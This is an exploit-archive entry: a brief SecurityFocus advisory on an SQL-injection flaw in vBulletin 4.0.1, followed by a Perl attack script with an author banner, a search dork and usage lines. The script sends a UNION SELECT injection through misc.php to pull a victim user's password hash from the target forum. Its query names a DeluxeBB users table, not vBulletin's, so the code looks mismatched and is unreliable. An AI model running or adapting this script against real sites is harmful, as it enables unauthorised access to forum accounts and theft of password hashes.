source: http://www.securityfocus.com/bid/37854/info

vBulletin is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.

Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.

vBulletin 4.0.1. is vulnerable; other versions may also be affected. 

#!/usr/bin/perl 
 
use IO::Socket; 
 
 
print q{ 
#######################################################################
#    vBulletin? Version 4.0.1 Remote SQL Injection Exploit            #
#                      By indoushka                                   #
#                     www.iq-ty.com/vb                                #
#               Souk Naamane  (00213771818860)                        #
#           Algeria Hackerz (indoushka@hotmail.com)                   # 
#          Dork: Powered by vBulletin? Version 4.0.1                  #            
####################################################################### 
}; 
 
if (!$ARGV[2]) { 
 
print q{ 
	Usage: perl  VB4.0.1.pl host /directory/ victim_userid 
 
       perl  VB4.0.1.pl www.vb.com /forum/ 1 
 
 
}; 
 
} 
 
 
$server = $ARGV[0]; 
$dir    = $ARGV[1]; 
$user   = $ARGV[2]; 
$myuser = $ARGV[3]; 
$mypass = $ARGV[4]; 
$myid   = $ARGV[5]; 
 
print "------------------------------------------------------------------------------------------------\r\n"; 
print "[>] SERVER: $server\r\n"; 
print "[>]    DIR: $dir\r\n"; 
print "[>] USERID: $user\r\n"; 
print "------------------------------------------------------------------------------------------------\r\n\r\n"; 
 
$server =~ s/(http:\/\/)//eg; 
 
$path  = $dir; 
$path .= "misc.php?sub=profile&name=0')+UNION+SELECT+0,pass,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0+FROM%20deluxebb_users%20WHERE%20(uid= '".$user ; 
 
 
print "[~] PREPARE TO CONNECT...\r\n"; 
 
$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$server", PeerPort => "80") || die "[-] CONNECTION FAILED"; 
 
print "[+] CONNECTED\r\n"; 
print "[~] SENDING QUERY...\r\n"; 
print $socket "GET $path HTTP/1.1\r\n"; 
print $socket "Host: $server\r\n"; 
print $socket "Accept: */*\r\n"; 
print $socket "Connection: close\r\n\r\n"; 
print "[+] DONE!\r\n\r\n"; 
 
 
 
print "--[ REPORT ]------------------------------------------------------------------------------------\r\n"; 
while ($answer = <$socket>) 
{ 
 
 if ($answer =~/(\w{32})/) 
{ 
 
  if ($1 ne 0) { 
   print "Password is: ".$1."\r\n"; 
print "--------------------------------------------------------------------------------------\r\n"; 
 
      } 
exit(); 
} 
 
} 
print "------------------------------------------------------------------------------------------------\r\n";

